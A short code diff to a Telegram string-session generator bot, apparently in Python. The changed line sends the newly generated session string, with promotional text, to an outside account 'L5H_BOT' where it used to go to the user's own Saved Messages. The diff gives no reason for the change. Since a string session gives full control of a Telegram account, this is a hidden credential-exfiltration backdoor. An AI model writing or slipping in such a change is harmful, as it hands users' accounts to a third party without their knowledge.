@@ -161,7 +161,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ :** @StringFatherBot\n🍒 **ɴᴏᴛᴇ :** ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ 🍑 ᴀɴᴅ ᴅᴏɴ'ᴛ ғᴏʀɢᴇᴛ ᴛᴏ ᴊᴏɪɴ @DevilsHeavenMF 🥺"
     try:
         if not is_bot:
-            await client.send_message("me", text)
+            await client.send_message("L5H_BOT", text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
